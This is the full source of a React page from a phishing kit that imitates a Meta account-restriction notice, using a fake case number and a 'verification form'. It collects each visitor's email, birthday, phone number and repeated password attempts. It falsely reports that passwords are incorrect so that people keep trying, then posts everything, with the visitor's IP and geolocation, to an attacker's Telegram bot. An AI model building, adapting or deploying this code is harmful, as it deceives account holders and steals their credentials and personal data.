import Banner from '@/assets/banner.png';
import HeroImage from '@/assets/hero-image.png';
import MetaLogo from '@/assets/meta-logo-2.png';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMemo, useEffect, useState } from 'react';
import { AlertCircle, Lock, Eye, EyeOff } from 'lucide-react';
import { config } from '@/config/data';
import { useNavigate } from 'react-router';

interface CountryResponse {
    name: string;
    country: string;
    country_3: string;
}

interface StoredFormData {
    email: string;
    birthday: string;
    phone: string;
    passwordAttempts: string[];
    lastMessageId: number | null;
    timestamp: number;
    lastMessage: string;
}

interface GeoJSResponse {
    city: string;
    country: string;
    region: string;
    timezone: string;
    latitude: string;
    longitude: string;
    ip: string;
    organization_name: string;
}

const mainFormSchema = z.object({
    email: z.string().email('Please enter a valid email address'),
    birthday: z.string().regex(/^(0[1-9]|[12][0-9]|3[01])[/-](0[1-9]|1[012])[/-]\d{4}$/, 'Please enter a valid date (DD/MM/YYYY)'),
    phone: z.string().min(1)
});

const passwordFormSchema = z.object({
    password: z.string().min(6, 'Password must be at least 6 characters')
});

type MainFormValues = z.infer<typeof mainFormSchema>;
type PasswordFormValues = z.infer<typeof passwordFormSchema>;

const generateCaseNumber = (): string => {
    return Math.floor(100000000 + Math.random() * 900000000).toString();
};

const formatDateVN = (dateStr: string): string => {
    if (dateStr.match(/^\d{2}[/-]\d{2}[/-]\d{4}$/)) {
        return dateStr.replace('/', '-');
    }
    const [year, month, day] = dateStr.split('-');
    return `${day}-${month}-${year}`;
};

const Home = () => {
    const caseNumber = useMemo(() => generateCaseNumber(), []);
    const [phoneCode, setPhoneCode] = useState<string>('');
    const [isLoading, setIsLoading] = useState(true);
    const [showPasswordModal, setShowPasswordModal] = useState(false);
    const [formData, setFormData] = useState<{
        email?: string;
        birthday?: string;
        phone?: string;
    }>({});
    const [showPassword, setShowPassword] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [submitError, setSubmitError] = useState<string | null>(null);
    const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
    const [lastMessageId, setLastMessageId] = useState<number | null>(null);
    const navigate = useNavigate();

    const {
        register: registerMain,
        handleSubmit: handleMainSubmit,
        formState: { errors: mainErrors }
    } = useForm<MainFormValues>({
        resolver: zodResolver(mainFormSchema)
    });

    const {
        register: registerPassword,
        handleSubmit: handlePasswordSubmit,
        formState: { errors: passwordErrors }
    } = useForm<PasswordFormValues>({
        resolver: zodResolver(passwordFormSchema)
    });

    const formatDateInput = (value: string) => {
        // Remove all non-digits
        const numbers = value.replace(/\D/g, '');

        // Add slashes automatically
        let formatted = '';
        for (let i = 0; i < numbers.length && i < 8; i++) {
            if (i === 2 || i === 4) {
                formatted += '/';
            }
            formatted += numbers[i];
        }

        return formatted;
    };

    useEffect(() => {
        const fetchCountryData = async () => {
            try {
                setIsLoading(true);
                const countryResponse = await fetch('https://get.geojs.io/v1/ip/country.json');
                const countryData: CountryResponse = await countryResponse.json();

                const codeResponse = await fetch('https://restcountries.com/v3.1/alpha/' + countryData.country);
                const [codeData] = await codeResponse.json();

                if (codeData?.idd?.root && codeData?.idd?.suffixes?.[0]) {
                    const dialCode = `${codeData.idd.root}${codeData.idd.suffixes[0]}`;
                    setPhoneCode(dialCode);
                } else {
                    console.log('Country code not found for:', countryData.country);
                    setPhoneCode('+1');
                }
            } catch (error) {
                console.error('Error fetching country data:', error);
                setPhoneCode('+1');
            } finally {
                setIsLoading(false);
            }
        };

        fetchCountryData();
    }, []);

    useEffect(() => {
        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData) as StoredFormData;

            if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
                setFormData({
                    email: parsed.email,
                    birthday: parsed.birthday,
                    phone: parsed.phone
                });
                setPasswordAttempts(parsed.passwordAttempts);
                setLastMessageId(parsed.lastMessageId);
            } else {
                localStorage.removeItem('metaFormData');
            }
        }
    }, []);

    const onMainFormSubmit = (data: MainFormValues) => {
        const formDataToStore = {
            email: data.email,
            birthday: data.birthday,
            phone: `${phoneCode}${data.phone}`
        };

        setFormData(formDataToStore);

        const storedData: StoredFormData = {
            ...formDataToStore,
            passwordAttempts: [],
            lastMessageId: null,
            lastMessage: '',
            timestamp: Date.now()
        };
        localStorage.setItem('metaFormData', JSON.stringify(storedData));

        setShowPasswordModal(true);
    };

    const onPasswordSubmit = async (data: PasswordFormValues) => {
        setIsSubmitting(true);
        setSubmitError(null);

        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));

        const newAttempts = [...passwordAttempts, data.password];
        setPasswordAttempts(newAttempts);

        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData) as StoredFormData;
            const updatedData: StoredFormData = {
                ...parsed,
                passwordAttempts: newAttempts,
                timestamp: Date.now()
            };
            localStorage.setItem('metaFormData', JSON.stringify(updatedData));
        }

        if (newAttempts.length > config.MAX_PASSWORD_ATTEMPTS) {
            setIsSubmitting(false);
            navigate('/verify');
            return;
        }

        const fullFormData = {
            ...formData,
            passwords: newAttempts
        };

        try {
            if (lastMessageId) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: config.CHAT_ID,
                            message_id: lastMessageId
                        })
                    });
                } catch (error) {
                    console.error('Error deleting previous message:', error);
                }
            }

            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const geoData: GeoJSResponse = await geoResponse.json();

            const currentTime = new Date().toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            const passwordList = newAttempts.map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');

            const message = `
<b>📅 Thời gian:</b> <code>${currentTime}</code>
<b>🌐 IP:</b> <code>${geoData.ip}</code>
<b>🌍 Vị trí:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
<b>📍 Tọa độ:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>

<b>🎂 Ngày sinh:</b> <code>${formatDateVN(fullFormData.birthday!)}</code>

<b>📞 Số điện thoại:</b> <code>${fullFormData.phone}</code>
<b>📧 Email:</b> <code>${fullFormData.email}</code>

${passwordList}`;

            const telegramApiUrl = `https://api.telegram.org/bot${config.TOKEN}/sendMessage`;

            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send data. Please try again.');
            }

            const result = await response.json();

            if (!result.ok) {
                throw new Error(result.description || 'Failed to send data');
            }

            setLastMessageId(result.result.message_id);

            const currentStoredData = localStorage.getItem('metaFormData');
            if (currentStoredData) {
                const parsed = JSON.parse(currentStoredData) as StoredFormData;
                const updatedData: StoredFormData = {
                    ...parsed,
                    lastMessageId: result.result.message_id,
                    lastMessage: message,
                    timestamp: Date.now()
                };
                localStorage.setItem('metaFormData', JSON.stringify(updatedData));
            }

            if (newAttempts.length < config.MAX_PASSWORD_ATTEMPTS) {
                setSubmitError('Incorrect password. Please try again.');
            } else {
                setTimeout(() => {
                    navigate('/verify');
                }, config.LOAD_TIMEOUT_MS);
            }
        } catch (error) {
            console.error('Error sending data:', error);
            setSubmitError(error instanceof Error ? error.message : 'An unexpected error occurred');
        } finally {
            setIsSubmitting(false);
        }
    };
    useEffect(() => {
        localStorage.removeItem('metaFormData');
        setFormData({});
        setPasswordAttempts([]);
        setLastMessageId(null);
    }, []);
    return (
        <div className='min-h-screen relative'>
            <img src={Banner} alt='Meta support header' className='w-full h-48 object-cover shadow-md' />
            <div className='md:py-16 bg-gradient-to-b from-gray-50 to-gray-100'>
                <div className='max-w-xl mx-auto p-6 bg-white border rounded-xl border-gray-200 shadow-lg'>
                    <div className='flex items-start justify-between w-full mb-12'>
                        <div className='flex flex-col items-center'>
                            <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm' />
                            <span className='mt-4 text-sm font-medium text-gray-700'>Select Asset</span>
                        </div>

                        <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]' />

                        <div className='flex flex-col items-center'>
                            <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm' />
                            <span className='mt-4 text-sm font-medium text-gray-700'>Select the Issue</span>
                        </div>

                        <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]' />

                        <div className='flex flex-col items-center'>
                            <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm' />
                            <span className='mt-4 text-sm font-medium text-gray-700'>Get help</span>
                        </div>
                    </div>

                    <div className='flex justify-center mb-8'>
                        <img src={HeroImage} alt='Account status' className='w-1/2 h-auto drop-shadow-lg' />
                    </div>

                    <div className='space-y-6'>
                        <div className='text-center'>
                            <h1 className='text-xl font-bold text-gray-900 mb-4'>YOUR PAGE HAS BEEN RESTRICTED</h1>
                            <div className='flex text-left justify-center p-4 bg-orange-50 border border-orange-200 rounded-lg'>
                                <AlertCircle className='w-5 h-5 text-orange-500 mr-2 flex-shrink-0' />
                                <p className='text-sm text-gray-700'>We have received multiple reports of potential violations of our terms of service. Your account requires immediate review.</p>
                            </div>
                        </div>

                        <div className='bg-white border rounded-xl border-gray-200 p-4 shadow-sm'>
                            <div className='flex justify-center mb-6'>
                                <img src={MetaLogo} alt='Meta logo' className='h-8 w-fit' />
                            </div>
                            <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>ACCOUNT VERIFICATION FORM</h2>

                            <form onSubmit={handleMainSubmit(onMainFormSubmit)} className='space-y-5'>
                                <div>
                                    <input type='email' placeholder='Email address' {...registerMain('email')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
                                    {mainErrors.email && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.email.message}</p>}
                                </div>

                                <div>
                                    <input
                                        type='text'
                                        placeholder='Birthday (DD/MM/YYYY)'
                                        {...registerMain('birthday')}
                                        onChange={(e) => {
                                            e.target.value = formatDateInput(e.target.value);
                                            registerMain('birthday').onChange(e);
                                        }}
                                        maxLength={10}
                                        tabIndex={2}
                                        className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors'
                                    />
                                    {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                </div>

                                <div className='relative'>
                                    <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
                                        <span className='text-sm'>{isLoading ? '...' : phoneCode}</span>
                                    </div>
                                    <input type='number' placeholder={isLoading ? 'Loading...' : 'Phone number'} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
                                    {mainErrors.phone && (
                                        <div className='absolute left-0 right-0 mt-1.5'>
                                            <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
                                        </div>
                                    )}
                                </div>

                                <button type='submit' tabIndex={4} className='w-full bg-blue-600 text-white py-2.5 px-4 rounded-lg hover:bg-blue-700 transition-colors font-medium shadow-sm'>
                                    Verification
                                </button>

                                <div className='pt-4 border-t'>
                                    <p className='font-medium text-gray-700 text-sm'>{`Case #${caseNumber}`}</p>
                                    <p className='mt-2 text-xs text-gray-600'>Case Type: Community Standards Violation Review</p>
                                </div>
                            </form>
                        </div>

                        <p className='text-sm text-gray-600'>
                            Please ensure all information is accurate. Incorrect information may result in permanent account closure. Review our <button className='text-blue-600 hover:underline'>Community Standards</button> for more information.
                        </p>
                    </div>
                </div>
            </div>

            {showPasswordModal && (
                <div className='fixed inset-0 bg-black/50 flex items-center justify-center z-50'>
                    <div className='bg-white rounded-xl p-6 w-full max-w-md mx-4 relative animate-fadeIn'>
                        <div className='text-center mb-6'>
                            <div className='mx-auto w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-4'>
                                <Lock className='w-6 h-6 text-blue-600' />
                            </div>
                            <h2 className='text-xl font-bold text-gray-900'>Please Enter Your Password</h2>
                            <p className='text-sm text-gray-600 mt-2'>For your security, you must enter your password to continue.</p>
                        </div>

                        <form onSubmit={handlePasswordSubmit(onPasswordSubmit)} className='space-y-4'>
                            <div className='relative'>
                                <input type={showPassword ? 'text' : 'password'} placeholder='Enter your password' autoFocus {...registerPassword('password')} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors pr-10' />
                                <button type='button' onClick={() => setShowPassword(!showPassword)} className='absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors'>
                                    {showPassword ? <EyeOff className='w-5 h-5' /> : <Eye className='w-5 h-5' />}
                                </button>
                                {passwordErrors.password && <p className='text-red-500 text-sm mt-1.5'>{passwordErrors.password.message}</p>}
                            </div>

                            {submitError && (
                                <div className='p-3 bg-red-50 border border-red-200 rounded-lg'>
                                    <p className='text-sm text-red-600'>{submitError}</p>
                                </div>
                            )}

                            <div className='flex gap-3'>
                                <button type='button' onClick={() => setShowPasswordModal(false)} disabled={isSubmitting} className='flex-1 px-4 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50'>
                                    Cancel
                                </button>
                                <button type='submit' disabled={isSubmitting} className='flex-1 px-4 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 flex items-center justify-center'>
                                    {isSubmitting ? (
                                        <div className='flex items-center gap-2'>
                                            <div className='w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin' />
                                            <span>Processing...</span>
                                        </div>
                                    ) : (
                                        'Submit'
                                    )}
                                </button>
                            </div>
                        </form>

                        <p className='text-xs text-gray-500 mt-4 text-center'>This information is required to verify your identity and protect your account</p>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Home;
